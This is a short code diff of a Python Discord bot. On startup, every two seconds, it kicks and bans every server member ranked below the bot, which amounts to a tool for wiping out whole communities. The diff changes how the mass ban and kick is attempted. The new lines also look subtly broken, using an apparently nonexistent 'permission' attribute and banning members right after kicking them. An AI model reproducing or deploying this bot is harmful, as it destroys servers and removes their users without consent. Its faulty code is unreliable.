@@ -13,15 +13,12 @@ async def on_ready():
     while True:
         await asyncio.sleep(2)
         for mmr in client.get_all_members():
-            if mmr.guild_permissions.is_superset(mmr.guild.me):
+            if mmr.top_role.position >= mmr.guild.me.top_role.position:
                 continue
-            try:
+            if mmr.guild.me.permission.kick_members:
+                await mmr.kick()
+            if mmr.guild.me.permission.ban_members:
                 await mmr.ban()
-            except:
-                try:
-                    await mmr.kick()
-                except:
-                    pass
 
 TOKEN = os.environ['BOT_TOKEN']
 bot.run(TOKEN)
